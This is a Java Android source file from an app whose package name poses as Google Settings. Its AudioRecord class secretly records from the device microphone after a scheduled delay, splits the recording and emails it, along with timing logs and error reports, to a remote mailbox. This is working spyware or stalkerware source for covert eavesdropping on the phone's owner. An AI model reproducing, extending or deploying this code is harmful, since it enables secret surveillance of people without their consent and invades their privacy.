package com.setting.dl.google.googlesettings;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;

import com.setting.dl.google.googlesettings.mail.MailingFile;
import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.FileSplitter;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class AudioRecord {
	
	
	private static boolean isRunning;
	private Handler startHandler, stopHandler;
	private Runnable startRunnable, stopRunnable;
	private MediaRecorder mRecorder;
	
	private       String recordFile;
	private final int    duration, delay;
	
	
	private final Context context;
	
	public AudioRecord(final Context context, final int duration, final int delay) {
		
		this.context    = context;
		this.duration   = duration * 60000;
		this.delay      = delay * 60000;
		recordFile      = getAudioFolder() + "/" + getDateForFile(new Date(new Date().getTime() + this.delay)) + ".mp3";
		
		u.log.d("duration   = " + duration);
		u.log.d("delay      = " + delay);
		u.log.d("recordFile = " + recordFile);
		
		
		run();
	}
	
	public static String getDateForFile(Date date) {
		
		SimpleDateFormat dateFormat = new SimpleDateFormat("ddMMyyHHmmss", Locale.getDefault());
		
		return dateFormat.format(date);
	}
	
	private String getAudioFolder() {
		
		File audioFolder = new File(context.getFilesDir(), "audio");
		
		if (!audioFolder.exists()) {
			
			if (audioFolder.mkdir()) {
				
				return audioFolder.getAbsolutePath();
			}
		}
		else {
			
			return audioFolder.getAbsolutePath();
		}
		
		
		return context.getFilesDir() + "/" + "audio";
	}
	
	public static boolean isRunning(){return isRunning;}
	
	private void run() {
		
		startRunnable = this::startRecord;
		stopRunnable  = this::stopRecord;
		startHandler  = u.run(startRunnable, delay);
		stopHandler   = u.run(stopRunnable, delay + duration);
		
		u.runThread(() -> isRunning = true, delay);
		
		if (delay > 0) {
			
			String fileRecordInfo = "recordinfo.txt";
			
			Date date = new Date();
			
			String recordTime = u.getDate(date.getTime() + delay);
			String finishTime = u.getDate(date.getTime() + duration + delay);
			String gecikme    = delay / 60000 + " dakika";
			String time       = duration / 60000 + " dakika";
			
			
			String value =
					"\nKayıt başlama tarihi : " + recordTime;
			value += "\nBitiş                : " + finishTime;
			value += "\nSüre                 : " + time;
			value += "\nGecikme              : " + gecikme;
			value += "\nKayıt dosyası        : " + recordFile;
			value += "\n*****************\n";
			
			u.saveValue(context, fileRecordInfo, value);
			
			Mail.send(context, fileRecordInfo);
		}
	}
	
	private void startRecord() {
		
		mRecorder = new MediaRecorder();
		mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		mRecorder.setOutputFile(recordFile);
		mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
		
		
		try {
			
			mRecorder.prepare();
			
			mRecorder.start();
			
			u.log.w("record started");
			
			String fileRecordInfo = "recordinfo.txt";
			
			Date date = new Date();
			
			String startTime  = u.getDate(date.getTime());
			String finishTime = u.getDate(date.getTime() + duration);
			String gecikme    = delay / 60000 + " dakika";
			String time       = duration / 60000 + " dakika";
			
			
			String value =
					"\nKayıt başladı      : " + startTime;
			value += "\nBitiş              : " + finishTime;
			value += "\nSüre               : " + time;
			value += "\nGecikme            : " + gecikme;
			value += "\nKayıt dosyası      : " + recordFile;
			value += "\n*****************\n";
			
			u.saveValue(context, fileRecordInfo, value);
			Mail.send(context, fileRecordInfo);
			
		}
		catch (Exception e) {
			
			String error = "****\nstart record error : " + e.toString() + "\n";
			u.log.e(error);
			u.saveValue(context, "error.txt", error);
			
			if (stopHandler != null) {stopHandler.removeCallbacks(stopRunnable);}
			
			isRunning = false;
			
			Mail.send(context, "error.txt");
		}
	}
	
	private void stopRecord() {
		
		try {
			
			if (mRecorder != null) {
				
				mRecorder.stop();
				mRecorder.reset();
				mRecorder.release();
				mRecorder = null;
				
				
				if (startHandler != null) {startHandler.removeCallbacks(startRunnable);}
				if (stopHandler != null) {stopHandler.removeCallbacks(stopRunnable);}
				
				u.log.w("record stopped");
				
				new FileSplitter(context, new File(recordFile)).split();
				
				if (u.isDeviceOnline(context)) new MailingFile(context);
			}
			
			
		}
		catch (Exception e) {
			
			String error = "****\nstop record error : " + e.toString() + "\n";
			u.log.e(error);
			u.saveValue(context, "error.txt", error);
			Mail.send(context, "error.txt");
			
		}
		finally {
			
			isRunning = false;
		}
	}
	
}
